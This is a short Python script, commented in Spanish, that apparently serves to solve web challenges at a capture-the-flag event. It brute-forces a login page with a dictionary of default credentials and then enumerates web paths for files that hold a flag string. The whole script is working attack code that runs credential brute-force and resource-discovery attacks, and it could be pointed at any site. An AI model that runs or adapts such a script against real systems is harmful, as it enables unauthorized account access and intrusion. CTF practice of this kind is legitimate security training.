#Codigo Juanra flags
import requests

# FUNCTIONS
def fuerza_bruta_psswd(url):
    #diccionario = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt"
    diccionario = "C:\\CTFs\\seclists\\ssh-betterdefaultpasslist.txt"

    fh = open(diccionario, 'r')
    lista = fh.read().split()
    fh.close()
    
    print("\n### STEP_1: Fuerza bruta de Autenticación de Usuarios en base a diccionario ###")
    print(f"#### Diccionario: {diccionario} ####")
    print(f"#### Nº Items: {len(lista)} ####\n")
      
    for item in lista:
        palabras = item.split(":")
        usuario = palabras[0]
        password = palabras[1]
        #print(f"User:{usuario} - Password:{password}")
        
        miurl = f"{url}index.php?username={usuario}&password={password}"
        print(miurl)
        #data = {"username": usuario, "password": password}
        salida = requests.get(miurl, headers={"UserAgent":"Mozilla 4.0"}).text
        print(salida)
        input("Enter key")
            
        if salida.find("Acceso No Autorizado") != -1:
            continue
        print(f"*** URL Autenticada: {miurl}")
        if salida.find("C0nclave") != -1:
            for line in salida.split():
                #print(line)
                if line.find("C0nclave") != -1:
                    print(f"*** FLAG Found: {line}")
            #print(f"\n*** Código HTML: {salida}")

            input("\nEnter any key")



def fuerza_bruta_objetos(url):
    diccionario = "C:\\CTFs\\seclists\\objects.txt"
    #extensions = [".html", ".php", ".txt", ".sql", ".json", ".bat", ".sqlite"]
    extensions = [".json"]

    fh = open(diccionario, 'r')
    lista = fh.read().split()
    fh.close()
    
    print("\n### STEP_2: Fuerza bruta de Acceso a recursos web en base a diccionario ###")
    print(f"#### Diccionario: {diccionario} ####")
    print(f"#### Extensiones: {extensions} ####")
    print(f"#### Nº Items: {len(lista)} ####\n")

    for item in lista:
        for ext in extensions:
            miurl = f"{url}{item}{ext}"
            salida = requests.get(miurl,headers={"UserAgent":"Mozilla 4.0"}).text

            if salida.find("404 Not Found") != -1:
                #print(f"URL NOT FOUND: {miurl}")
                continue
            print(f"*** URL FOUND: {miurl}")
            print(f"\n*** Código HTML: {salida}")

            if salida.find("C0nclave") != -1:
                print(f"*** URL con la FLAG: {miurl}")  
                print(salida)
            input("Enter any key")


# END FUNCTIONS

# MAIN
url = "http://winterfallctffp.thehackerconclave.es:3160"

while True:
    reto = input("Introduce el número del RETO: ")
    try:
        int(reto)
        url = url+reto+"/"
        break
    except:
        print("## ERROR: Número de Reto no válido ##\n")

print(f"\n### URL del RETO {reto}: {url} ###")


fuerza_bruta_psswd(url)
fuerza_bruta_objetos(url)

